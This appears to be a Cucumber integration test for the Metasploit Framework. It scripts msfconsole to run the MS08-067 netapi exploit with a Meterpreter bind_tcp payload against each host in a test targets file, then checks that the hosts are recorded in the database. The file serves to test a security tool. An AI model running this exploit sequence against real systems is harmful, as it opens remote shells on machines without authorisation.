@targets @db
Feature: MS08-067 netapi

  Background:
    Given a directory named "home"
    And I cd to "home"
    And a mocked home directory

  Scenario: The MS08-067 should get a session with bind_tcp
    Given I ready the windows targets
    Given a file named "ms08-067-bind.rc" with:
      """
        <ruby>
          hosts = YAML.load File.open Rails.root.join('features', 'support', 'targets.yml')
          self.run_single('use exploit/windows/smb/ms08_067_netapi')
          self.run_single('set payload windows/meterpreter/bind_tcp')
          hosts.each do |host|
            self.run_single("set RHOST #{host['ipAddress']}")
            self.run_single('run -j')
            sleep 1
          end
          self.run_single('sessions -K')
        </ruby>
      """
    When I run `msfconsole --environment test -q -r ms08-067-bind.rc -x exit`
    Then the 'Mdm::Host' table contains the expected targets
    